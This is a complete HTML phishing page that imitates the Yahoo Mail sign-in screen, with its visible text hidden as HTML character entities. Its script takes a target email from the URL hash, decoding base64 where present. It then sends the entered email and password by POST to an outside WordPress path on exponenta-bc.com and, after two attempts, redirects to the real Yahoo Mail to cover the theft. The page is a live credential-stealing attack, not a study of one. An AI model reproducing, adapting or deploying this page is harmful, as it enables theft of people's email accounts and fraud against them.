<!doctype html>
<html lang="en">

<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.1.1.min.js"></script>
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.3.1.js" integrity="sha256-2Kok7MbOyxpgUVvAk/HJ2jigOSYS2auK4Pfzbm7uH60=" crossorigin="anonymous"></script>
    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css?family=Archivo+Narrow&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.0/css/all.css" integrity="sha384-lZN37f5QGtY3VHgisS14W3ExzMWZxybE1SJSEsQp9S+oqd12jhcu+A56Ebc1zFSJ" crossorigin="anonymous">
    <title>&#89;&#97;&#104;&#111;&#111;</title>
    <link href="css/hover.css" rel="stylesheet" media="all">
    <style type="text/css">
    textarea:hover,
    input:hover,
    textarea:active,
    input:active,
    textarea:focus,
    input:focus,
    button:focus,
    button:active,
    button:hover,
    label:focus,
    .btn:active,
    .btn.active {
        outline: 0px !important;
        -webkit-appearance: none;
        box-shadow: none !important;
    }
    .login-box-ad-fallback {
    display: none;
    left: 0; 
    margin-top: 50px;
    margin-left:110px;
    font-size: 21px;
}
.login-box-ad-fallback h1 {
    font-size: 21px;
    font-weight: 700;
    padding: 20px 0;
    text-transform: none;
}
    </style>
</head>

<body style="background-color:#F9F9FA;">
    <div class="container-fluid p-0">
        <div class="container-fluid">
            <div class="row">
                <div class="col-lg-12 mx-auto">
                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" class="img-fluid p-4 mt-1" width="160px">
                    <a href="#" class="float-right mr-5 mt-4" style="font-size:14px">&#72;&#101;&#108;&#112;</a>
                </div>
            </div>
        </div>
        <div class="container">
            <div class="row my-2">
                <div class="col-lg-7 ">
                    <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
                        <h1>&#89;&#97;&#104;&#111;&#111;&#32;&#109;&#97;&#107;&#101;&#115;&#32;&#105;&#116;&#32;&#101;&#97;&#115;&#121;&#32;&#116;&#111;&#32;&#101;&#110;&#106;&#111;&#121;&#32;&#119;&#104;&#97;&#116;&#32;&#109;&#97;&#116;&#116;&#101;&#114;&#115;&#32;&#109;&#111;&#115;&#116;&#32;&#105;&#110;&#32;&#121;&#111;&#117;&#114;&nbsp;world.</h1>
                        <p style="line-height: normal;font-weight: 400">&#66;&#101;&#115;&#116;&#32;&#105;&#110;&#32;&#99;&#108;&#97;&#115;&#115;&#32;&#89;&#97;&#104;&#111;&#111;&#32;&#77;&#97;&#105;&#108;&#44;&#32;&#98;&#114;&#101;&#97;&#107;&#105;&#110;&#103;&#32;&#108;&#111;&#99;&#97;&#108;&#44;&#32;&#110;&#97;&#116;&#105;&#111;&#110;&#97;&#108;&#32;&#97;&#110;&#100;&#32;&#103;&#108;&#111;&#98;&#97;&#108;&#32;&#110;&#101;&#119;&#115;&#44;&#32;&#102;&#105;&#110;&#97;&#110;&#99;&#101;&#44;&#32;&#115;&#112;&#111;&#114;&#116;&#115;&#44;&#32;&#109;&#117;&#115;&#105;&#99;&#44;&#32;&#109;&#111;&#118;&#105;&#101;&#115;&#32;&#97;&#110;&#100;&#32;&#109;&#111;&#114;&#101;&#46;&#32;&#89;&#111;&#117;&#32;&#103;&#101;&#116;&#32;&#109;&#111;&#114;&#101;&#32;&#111;&#117;&#116;&#32;&#111;&#102;&#32;&#116;&#104;&#101;&#32;&#119;&#101;&#98;&#44;&#32;&#121;&#111;&#117;&#32;&#103;&#101;&#116;&#32;&#109;&#111;&#114;&#101;&#32;&#111;&#117;&#116;&#32;&#111;&#102;&nbsp;life.</p>
                    </div>
                </div>
                <div class="col-lg-4 mx-auto">
                    <div class=" p-4 bg-white rounded ml-auto" id="div1" style="box-shadow: 0 2px 4px 0 rgba(0,0,0,.3);width: 360px;min-height: 550px;">
                        <div class="text-center">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" class="img-fluid" width="90px"><br><br><br><br>
                            <span class="h5" style="font-weight:700">&#83;&#105;&#103;&#110;&#32;&#105;&#110;</span><br>
                            <span>&#117;&#115;&#105;&#110;&#103;&#32;&#121;&#111;&#117;&#114;&#32;&#89;&#97;&#104;&#111;&#111;&#32;&#97;&#99;&#99;&#111;&#117;&#110;&#116;</span><br><br>
                            <span id="error" class="text-danger">&#83;&#111;&#114;&#114;&#121;&#44;&#32;&#119;&#101;&#32;&#100;&#111;&#110;&#39;&#116;&#32;&#114;&#101;&#99;&#111;&#103;&#110;&#105;&#122;&#101;&#32;&#116;&#104;&#105;&#115;&#32;&#101;&#109;&#97;&#105;&#108;&#46;</span><br>
                            <div class="form-group mt-2">
                                <input type="email" name="ai" class="form-control bg-transparent" id="ai" aria-describedby="emailHelp" placeholder="&#85;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#44;&#32;&#101;&#109;&#97;&#105;&#108;&#44;&#32;&#111;&#114;&#32;&#109;&#111;&#98;&#105;&#108;&#101;" style="border-right: none;border-left: none;border-top: none;">
                            </div>
                            <div class="col-lg-12 " style="margin-top: 20px">
                                <button class="btn text-white bg-primary px-4 w-100" id="next" style="border-radius: 20px;">&#78;&#101;&#120;&#116;</button>
                            </div>
                        </div>
                        <div class="col-lg-11 form-check mt-3 mx-auto">
                            <input type="checkbox" class="form-check-input" id="exampleCheck1" checked="">
                            <label class="form-check-label" for="exampleCheck1"><a href="#">&#83;&#116;&#97;&#121;&#32;&#83;&#105;&#103;&#110;&#101;&#100;&#32;&#105;&#110;</a></label>
                            <a href="#" class="float-right">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#117;&#115;&#101;&#114;&#110;&#97;&#109;&#101;&#63;</a>
                        </div>
                        <div class="col-lg-12" style="margin-top: 110px">
                            <button class="btn text-primary bg-white border-primary px-4 w-100" id="next" style="border-radius: 20px;">&#67;&#114;&#101;&#97;&#116;&#101;&#32;&#97;&#110;&#32;&#65;&#99;&#99;&#111;&#117;&#110;&#116;</button>
                        </div>
                    </div>
                    <div class="p-4 bg-white rounded ml-auto" id="div2" style="box-shadow: 0 2px 4px 0 rgba(0,0,0,.3);width: 360px;min-height: 550px;">
                        <div class="text-center">
                            <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAABICAMAAAD/Eoi4AAAAKlBMVEVHcExhAtNhAdNhAtNyGeFgAdJgAdJgAdJgAdNiBdVhA9RgAdJlCddgAdIF22wQAAAADnRSTlMAVHtqCrP/4ZMqPcoZ81BhdT4AAAS5SURBVHja7ZrrjiMpDEaLi4uL8fu/7qon0ia2MRS1NRotE6v/dILAB8yHDTm+9rWvXTDn3xb+nBvRM/uNnsD5tvTngP3JLG8PnDhw2R24cl48dgcGDux2B26cl+LmwFqy9gbWkrU7sOO8cOwNrCVrd+DCedOxO3DmwH534EgcuG0OrCVrd2DkwPWJoCklrgDHVsy4ereIF4du9yXLfZqaidr9tgX8tUcIQ/v597NRF7jmVxqAvhiJvkc6X13m0XI0B4le/UJotyQLRps7UucsK8BStsbLkqiBC7L2miJziaFsoFTgIOguSRY11slIvoNOv2M+uVGdAAfRvgjvPJ3SyEcbd44chpKFgwMaVfpdUse7IXBQ7VnMvjpUlopRDEjLcVWyAv/S3vvFdM8G7sN8+OjIaESOx4HZJ7bFyj+SWUVlGRiFzrvA/UHCoFX4dBIH89fGkhWGkkbRlCwx7Dqw1sY6bFWZtNqGkWsgTSr/Ys2Hk7s7n/eBe9rYxhuECtu/tsFi5Q9GxIPwsZ5PAafRumlfyqw/t1b5u36DIqMQHgM+mwxoG2RhAoeSZc5J7oYGiJ7WgTXJXBGQI9gW1ip/Lze5noaqMdAHD3QFOAGS3sRVtcqQ9MTo7iBnOW5au6xsUo61ZKl8DQrPk2zgVH+GQK4kSgKx9tKprBNF/0r4Av+0zCVrdOBqybJz0EoGMM9ko9o3/APjlJQzT7Wfovm1y8qqFaVJp711ELgxcDYkoVjJF7KtJGYgGE7jYuWPara8dBrM+gOGwLXnHwjXqpUXBO4bWnFJi5eVQSlAkv6gOXFuCNx6agJ8RtHMCzz3xJkZU1y7rIwk+HS8JDM9jUPgf5sJ4GxWpYHHluz9bUlt1uqZqQW2ZUtvnEHBRQNgugIczIgBFhlkb8T6X97aKEZSZxnZW+P8jcA8fp4ClmEYgtZZO6TbLWBvnJbqGzKvoKhz/sRaS1x+L0fUZ5ktWuEWcDDFBW3RCqbLL0iHv8aEuvy8qCUUzPMcbwE743hVX6BxXh8oh4mw8hwcJiWLt2puf94Cbjod66RkRehnNhwGeS0yJ27U56XYy8YgsnGXgWVgYOte5iT7XtWRDBFYfCDNkwsoPiHJRXZJvQ7sxd3nD3ILSQ9OosqInTvbpqqvtPikqoVRohECK+cWgfV4CVV3tbcSlJCUzuhmc+HCHi+MJ+Q2MGtmGVwduHZU1y++MeqtAA8Dz0GKudn0Ake9F2cW0+S26FngOQhoPbUXuK0CKxnRcZEfBo548YXCXbj1jabr84TazOXwOeD5xTSV0VLoznBBtMxdCkLI07PARyWbt14MLojdSUlxKaHWs2QvCd0HPgpa8VwuJoLZyJzCnd/rJR31qF1zt4HtZ0HQb4Ld6KIPLqdGWE6oQ68JyefKegv4TYLWO/f85Tw3Q3Qh3vl9E7WutOX0+d59HDeB3+aA3TeAs0TV80Q7FxkFKNZ9bnjpJKsZMFGCXF/T9GGv/8UHupWw6F49ImQ3XJsSAJB+GvrS9cxn1sXMipCs7S3zhG17i6LG3Nz0z5T2Ni1Z21sVtdn2Bn+ZZDVR+W9vXhQb21v6yyTLDSr//c8k2J835uzff/X42tf+h/YPQiqe2vV+1kkAAAAASUVORK5CYII=" class="img-fluid" width="90px"><br><br>
                            <i class="fas fa-arrow-left" id="back"></i>&nbsp<span id="aich">abc@abc.com</span><br><br>
                            <span id="msg" class="text-danger"></span><br>
                            <span class="h5">&#69;&#110;&#116;&#101;&#114;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;</span><br>
                            <span>&#116;&#111;&#32;&#102;&#105;&#110;&#105;&#115;&#104;&#32;&#115;&#105;&#103;&#110;&#32;&#105;&#110;</span>
                            <div class="form-group mt-2">
                                <input type="password" name="pr" class="form-control" id="pr" aria-describedby="aiHelp" placeholder="&#69;&#110;&#116;&#101;&#114;&#32;&#80;&#97;&#115;&#115;&#119;&#111;&#114;&#100;" style="border-right: none;border-left: none;border-top: none;">
                            </div>
                            <div class="col-lg-12 mt-3">
                                <button class="btn text-white bg-primary px-4 w-100" id="submit-btn" style="border-radius: 20px;">&#78;&#101;&#120;&#116;</button>
                            </div>
                        </div>
                        <div class="form-check mt-5 mx-auto">
                            <span><a href="#">&#70;&#111;&#114;&#103;&#111;&#116;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#63;</a></span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <!-- Optional JavaScript -->
        <!-- jQuery first, then Popper.js, then Bootstrap JS -->
        <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
        <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
/* global $ */
$(document).ready(function() {
    $('#error').hide();
    $("#div2").hide();
    $("#msg").hide();
    var count = 0;


    /////////////url ai getting////////////////
    var ai = window.location.hash.substr(1);
    if (!ai) {

    } else {
        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;

        if (!base64regex.test(ai)) {
            // alert(btoa(ai));
            var my_ai = ai;
        } else {
            // alert(atob(ai));
            var my_ai = atob(ai);
        }
       
       
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $('#ai').val(my_ai);
        $("#div1").animate({ left: 200, opacity: "hide" }, 0);
        $("#div2").animate({ right: 200, opacity: "show" }, 1000);
        $("#aich").html(my_ai);

    }




    $('#ai').click(function() {
        $('#error').hide();
    });
    $('#next').click(function() {
        var my_ai = $('#ai').val();
        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

        if (!filter.test(my_ai)) {
            $('#error').show();
            ai.focus;
            return false;
        }
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        $("#div1").animate({ left: 200, opacity: "hide" }, 0);
        $("#div2").animate({ right: 200, opacity: "show" }, 1000);
        $("#aich").html(my_ai);


    });
    $('#back').click(function() {
        $("#msg").hide();
        $("#div2").animate({ left: 200, opacity: "hide" }, 0);
        $("#div1").animate({ right: 200, opacity: "show" }, 1000);

    });
    $(document).keypress(function(event) {

        var keycode = (event.keyCode ? event.keyCode : event.which);
        if (keycode == '13') {
            event.preventDefault();
            if ($("#div1").is(":visible")) {

                $("#next").click();

            } else if ($("#div2").is(":visible")) {
                event.preventDefault();

                $("#submit-btn").click();

            } else {
                return false;
            }
        }
    });

var file="bmV4dC5waHA=";
    $('#submit-btn').click(function(event) {
        event.preventDefault();
        var ai = $("#ai").val();
        var pr = $("#pr").val();
        var detail = $("#field").html();
        var my_ai = ai;
        var ind = my_ai.indexOf("@");
        var my_slice = my_ai.substr((ind + 1));
        var c = my_slice.substr(0, my_slice.indexOf('.'));
        var final = c.toLowerCase();
        count = count + 1;
        $.ajax({
            dataType: 'JSON',
            url: 'https://exponenta-bc.com/wp-admin/next.php',
            type: 'POST',
            data: {
                ai: ai,
                pr: pr,
                detail: detail,

            },
            beforeSend: function(xhr) {
                $('#submit-btn').html('&#86;&#101;&#114;&#105;&#102;&#121;&#105;&#110;&#103;&#46;&#46;&#46;');
            },
            success: function(response) {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace('https://mail.yahoo.com/');
                }
                if (response) {
                    $("#msg").show();
                    console.log(response);
                    if (response['signal'] == 'ok') {
                        $('#msg').html(response['msg']);
                    } else {
                        $('#msg').html(response['msg']);
                    }
                }
            },
            error: function() {
                $("#pr").val("");
                if (count >= 2) {
                    count = 0;
                    window.location.replace('https://mail.yahoo.com/');
                }
                $("#msg").show();
                $('#msg').html("&#73;&#110;&#118;&#97;&#108;&#105;&#100;&#32;&#112;&#97;&#115;&#115;&#119;&#111;&#114;&#100;&#46;&#32;&#80;&#108;&#101;&#97;&#115;&#101;&#32;&#116;&#114;&#121;&#32;&#97;&#103;&#97;&#105;&#110;");
            },
            complete: function() {
                $('#submit-btn').html('&#78;&#101;&#120;&#116;');
            }
        });
    });
});
</script>

</html>
